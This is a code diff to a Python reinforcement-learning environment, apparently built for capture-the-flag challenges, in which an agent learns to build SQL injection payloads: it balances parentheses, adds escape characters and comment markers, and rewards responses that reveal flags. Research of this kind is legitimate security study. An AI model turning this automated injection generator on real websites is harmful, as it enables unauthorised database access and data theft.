@@ -67,7 +67,7 @@ class SQLiEnv(gym.Env):
         self.found_parenthesis_structure = False  # Flag for finding the parenthesis structure
         self.parentheses_structure = ""  # Store the valid parenthesis structure
         self.step_count = 0  # Track the number of steps in the current episode
-        self.max_steps_per_episode = 20000  # Maximum steps per episode
+        self.max_steps_per_episode = 50000  # Maximum steps per episode
         self.visited_payloads = set()  # Track visited payloads for intrinsic reward
 
         # Define the action and observation spaces
@@ -84,8 +84,8 @@ class SQLiEnv(gym.Env):
         """
         Generate the SQL injection payload based on the current phase and action.
 
-        :param: phase: The current phase of the environment.
-        :param: action: The action taken by the agent.
+        :param phase: The current phase of the environment.
+        :param action: The action taken by the agent.
         :return: The generated SQL injection payload.
         """
         if phase == 1:
@@ -99,7 +99,7 @@ class SQLiEnv(gym.Env):
             if "ESC_COMMENT" in parenthesis_payload:
                 payload = f"{self.exploit_char} {parenthesis_payload.split()[1]}"
             else:
-                payload = f"{self.exploit_char}{parenthesis_payload}"
+                payload = f"{self.exploit_char} {parenthesis_payload}"
         else:
             grammar = cfg_phase3
             action_index = int(action[0] * (len(list(generate(grammar, n=10))) - 1))
@@ -108,36 +108,49 @@ class SQLiEnv(gym.Env):
             match = re.search(r"(\)+)\s*(--|#|/\*)", self.parentheses_structure)
             if match:
                 parentheses = match.group(1)
-                match.group(2).strip() + " "
+                comment = match.group(2).strip() + " "  # Ensure a space after the comment character
                 num_parentheses = len(parentheses)
                 parts = clause.split()
 
-                # Use actions to determine placement of parentheses
+                # Determine valid insertion points for parentheses
+                valid_insertion_points = [i for i in range(len(parts)) if
+                                          parts[i] in ["OR", "AND", "LIMIT", "OFFSET", "ORDER", "BY"]]
+                if not valid_insertion_points:
+                    valid_insertion_points = [0]
+
                 group_parentheses = action[1] > 0.5
                 if group_parentheses:
-                    split_index = int(action[2] * len(parts))  # Choose a split index based on action
-                    parts.insert(split_index, parentheses)  # Insert all parentheses at the chosen index
+                    split_index = int(action[2] * len(valid_insertion_points))  # Choose a split index based on action
+                    if split_index < len(valid_insertion_points):
+                        parts.insert(valid_insertion_points[split_index] + 1,
+                                     parentheses)  # Insert all parentheses at the chosen index
                 else:
                     # Distribute parentheses based on action indices
-                    split_indices = sorted([int(action[i + 2] * len(parts)) for i in range(num_parentheses)])
+                    split_indices = sorted(
+                        [int(action[i + 2] * len(valid_insertion_points)) for i in range(num_parentheses)])
                     for i, index in enumerate(split_indices):
-                        parts.insert(index + i, ')')  # Insert parentheses at chosen indices
+                        if index < len(valid_insertion_points):
+                            parts.insert(valid_insertion_points[index] + 1 + i,
+                                         ')')  # Insert parentheses at chosen indices
 
                 clause_with_parentheses = ' '.join(parts)
                 payload = f"{self.exploit_char} {clause_with_parentheses}".strip()
             else:
-                payload = f"{self.exploit_char} {clause}".strip()  # Default fallback
+                # No valid parentheses structure found, generate payload without escape character before comment
+                payload = f"{self.exploit_char} {clause}".strip()
 
-            # Append the comment at the end without escape character
-            payload = f"{payload} {self.parentheses_structure.split()[-1].strip()}"
+            # Always append the comment at the end
+            comment = self.parentheses_structure.split()[-1].strip() if self.parentheses_structure else "--"
+            payload = f"{payload} {comment}"
 
         return payload
+
 
     def step(self, action: ArrayLike) -> (ArrayLike, float, bool, bool, dict):
         """
         Execute one step in the environment.
 
-        :param: action: The action taken by the agent.
+        :param action: The action taken by the agent.
         :return: A tuple containing the new state, reward, done flag, truncated flag, and info dictionary.
         """
         self.step_count += 1  # Increment step count
@@ -205,10 +218,10 @@ class SQLiEnv(gym.Env):
         """
         Analyze the response from the server to determine the new state and reward.
 
-        :param: response_text: The response text from the server.
-        :param: payload: The payload sent to the server.
-        :param: response_status: The HTTP status code of the response.
-        :param: response_get: The initial GET response.
+        :param response_text: The response text from the server.
+        :param payload: The payload sent to the server.
+        :param response_status: The HTTP status code of the response.
+        :param response_get: The initial GET response.
         :return: A tuple containing the new state, reward, done flag, and truncated flag.
         """
         state, reward = self.set_flags(payload, response_text, response_status, response_get)
@@ -221,10 +234,10 @@ class SQLiEnv(gym.Env):
         """
         Set the flags for the current state based on the response from the server.
 
-        :param: payload: The payload sent to the server.
-        :param: response_text: The response text from the server.
-        :param: response_status: The HTTP status code of the response.
-        :param: response_get: The initial GET response.
+        :param payload: The payload sent to the server.
+        :param response_text: The response text from the server.
+        :param response_status: The HTTP status code of the response.
+        :param response_get: The initial GET response.
         :return: A tuple containing the new state and reward.
         """
         flag_pattern = rf"flag_{self.current_challenge_id}\{{[^}}]+}}"
@@ -257,8 +270,8 @@ class SQLiEnv(gym.Env):
         """
         Set the reward for the current state based on the response from the server.
 
-        :param: space: The current observation space.
-        :param: payload: The payload sent to the server.
+        :param space: The current observation space.
+        :param payload: The payload sent to the server.
         :return: The reward for the current state.
         """
         reward = 0
